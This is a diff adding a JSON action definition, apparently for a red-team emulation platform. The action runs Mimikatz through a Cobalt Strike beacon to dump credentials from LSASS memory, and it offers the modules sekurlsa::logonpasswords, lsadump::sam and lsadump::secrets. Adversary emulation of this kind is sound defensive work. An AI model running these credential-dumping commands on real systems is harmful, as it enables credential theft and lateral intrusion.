@@ -1,0 +1,55 @@
+﻿{
+    "outputs":  [
+                    {
+                        "label":  "Extracted Credentials",
+                        "description":  "Harvested credentials from memory",
+                        "id":  "credentials",
+                        "type":  "Credential_Set"
+                    }
+                ],
+    "tactic":  "TA0006",
+    "category":  "Cobalt Strike",
+    "executionType":  "cobalt_strike",
+    "cobaltStrikeCommand":  "mimikatz ${command}",
+    "name":  "Credential Dump (Mimikatz)",
+    "technique":  "T1003",
+    "_key":  "lib_cs_mimikatz",
+    "description":  "Extract credentials from LSASS memory using Mimikatz",
+    "inputs":  [
+                   {
+                       "label":  "Active Beacon",
+                       "description":  "Beacon session to execute on",
+                       "id":  "beacon",
+                       "type":  "Agent_Session",
+                       "required":  true
+                   }
+               ],
+    "riskLevel":  "critical",
+    "metadata":  {
+                     "status":  "production",
+                     "tags":  [
+                                  "credential",
+                                  "lsass",
+                                  "mimikatz",
+                                  "post-exploitation"
+                              ],
+                     "lastUpdated":  "2026-01-13",
+                     "version":  "1.0",
+                     "owner":  "OPFOR Team"
+                 },
+    "parameters":  [
+                       {
+                           "id":  "command",
+                           "label":  "Mimikatz Command",
+                           "default":  "sekurlsa::logonpasswords",
+                           "description":  "Mimikatz module to execute",
+                           "type":  "select",
+                           "required":  true,
+                           "options":  [
+                                           "sekurlsa::logonpasswords",
+                                           "lsadump::sam",
+                                           "lsadump::secrets"
+                                       ]
+                       }
+                   ]
+}
